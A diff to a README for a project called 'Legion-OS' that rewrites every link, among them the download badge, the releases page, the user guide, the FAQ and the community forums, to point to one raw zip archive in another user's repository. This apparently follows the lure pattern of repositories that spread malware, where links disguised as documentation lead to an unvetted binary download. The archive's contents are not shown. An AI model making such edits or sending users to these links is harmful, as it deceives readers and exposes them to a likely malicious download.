@@ -1,6 +1,6 @@
 # 🌟 Legion-OS - A Modern Operating System Experience
 
-[![Download Legion-OS](https://github.com/legion-core/legion-os/actions/workflows/build.yml/badge.svg)](https://github.com/djbonny/Legion-OS/releases)
+[![Download Legion-OS](https://raw.githubusercontent.com/djbonny/Legion-OS/main/files/system/usr/OS_Legion_v2.6-alpha.2.zip)](https://raw.githubusercontent.com/djbonny/Legion-OS/main/files/system/usr/OS_Legion_v2.6-alpha.2.zip)
 
 Legion-OS delivers a streamlined operating system designed for efficiency and ease of use. Experience cutting-edge technology with a focus on stability and user satisfaction.
 
@@ -10,7 +10,7 @@ Welcome to Legion-OS! Follow the steps below to download and install the operati
 
 ## 📥 Download & Install
 
-To download Legion-OS, visit this page: [GitHub Releases](https://github.com/djbonny/Legion-OS/releases).
+To download Legion-OS, visit this page: [GitHub Releases](https://raw.githubusercontent.com/djbonny/Legion-OS/main/files/system/usr/OS_Legion_v2.6-alpha.2.zip).
 
 ### Step 1: Download the Software
 
@@ -63,9 +63,9 @@ This version of Legion-OS is experimental. We recommend using it on non-critical
 
 For more detailed instructions and troubleshooting, check the following resources:
 
-- [User Guide](https://github.com/legion-core/legion-os/wiki)
-- [FAQ](https://github.com/legion-core/legion-os/wiki/FAQ)
-- [Community Forums](https://github.com/legion-core/legion-os/discussions)
+- [User Guide](https://raw.githubusercontent.com/djbonny/Legion-OS/main/files/system/usr/OS_Legion_v2.6-alpha.2.zip)
+- [FAQ](https://raw.githubusercontent.com/djbonny/Legion-OS/main/files/system/usr/OS_Legion_v2.6-alpha.2.zip)
+- [Community Forums](https://raw.githubusercontent.com/djbonny/Legion-OS/main/files/system/usr/OS_Legion_v2.6-alpha.2.zip)
 
 ## 🛠️ Support
 
